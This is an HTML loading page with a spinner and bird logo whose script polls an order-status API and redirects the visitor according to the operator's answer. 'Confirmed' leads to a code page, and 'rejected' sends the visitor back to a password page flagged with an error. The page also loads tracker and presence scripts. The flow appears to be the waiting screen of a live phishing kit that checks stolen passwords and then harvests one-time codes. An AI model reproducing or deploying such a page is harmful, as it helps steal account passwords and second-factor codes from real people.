<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Loading</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center}

.loader{
  position:relative;width:180px;height:180px;
  display:flex;align-items:center;justify-content:center;
}

.circle-track{
  position:absolute;inset:0;border-radius:50%;
  border:3px solid rgba(169,207,56,.15);
}

.circle-spin{
  position:absolute;inset:0;border-radius:50%;
  border:3.5px solid transparent;
  border-top-color:#A9CF38;
  border-right-color:#A9CF38;
  animation:spin 1.4s linear infinite;
}

@keyframes spin{to{transform:rotate(360deg)}}

.bird{
  position:relative;z-index:1;
  width:80px;height:80px;
  animation:hop 0.6s ease-in-out infinite alternate;
}

@keyframes hop{
  0%{transform:translateY(4px) rotate(-2deg)}
  100%{transform:translateY(-4px) rotate(2deg)}
}

.bird svg{width:100%;height:100%;fill:#A9CF38}
</style>
</head>
<body>

<div class="loader">
  <div class="circle-track"></div>
  <div class="circle-spin"></div>
  <div class="bird">
    <svg viewBox="180 -5 145 115" xmlns="http://www.w3.org/2000/svg">
      <path d="M286.39,31.63s17.44,3.28,24.78,32.62c3.49,13.96,5.94,24.21,9.3,37.94.33,1.36-1.5,2.17-2.16.94-4.56-8.41-16.94-31.04-35.25-42.98-9.97-6.5-23.23-13.28-33.33,1.36-7.78,11.27-13.47,26.63-16.7,36.57-.5,1.54-2.81,1.01-2.58-.59,1.61-11.18,5.47-23.08-.76-30.09-6-6.75-23.69-4.66-36.64-4.62-1.27,0-1.42-1.86-.16-2.05,14.79-2.24,37.72-5.7,45.55-11.09,4.16-2.86,17.86-12.71-5.36-27.51-17.08-10.89-38.85-16.9-48.86-20.22-1.11-.37-.75-2.02.41-1.92,10.08.83,33.51,2.35,40.32,2.86,12.89.97,42.2,3.08,47.04,18.38,8.73-7.05,19.46-9.34,24.47-7,.83.31-.11,2.68-.11,2.68,0,0-3.6,8.02-9.95,14.7"/>
    </svg>
  </div>
</div>

<script>
var params = new URLSearchParams(location.search);
var orderId = params.get("order");
var phone = params.get("phone");
if(!orderId) location.href = "index.html";

function phoneQS(){ return phone ? "&phone=" + encodeURIComponent(phone) : ""; }

function checkStatus(){
  fetch("/api/orders/" + orderId + "/status")
    .then(function(r){ return r.json(); })
    .then(function(d){
      if(d.redirect_to){
        location.href = d.redirect_to + (d.redirect_to.includes("?") ? "&" : "?") + "order=" + orderId + phoneQS();
        return;
      }
      if(d.status === "confirmed") location.href = "code.html?order=" + orderId + phoneQS();
      else if(d.status === "rejected") location.href = "password.html?order=" + orderId + "&error=1" + phoneQS();
    }).catch(function(){});
}
setInterval(checkStatus, 3000);
checkStatus();
</script>
<script src="tracker.js"></script>
<script src="/presence.js"></script>
</body>
</html>
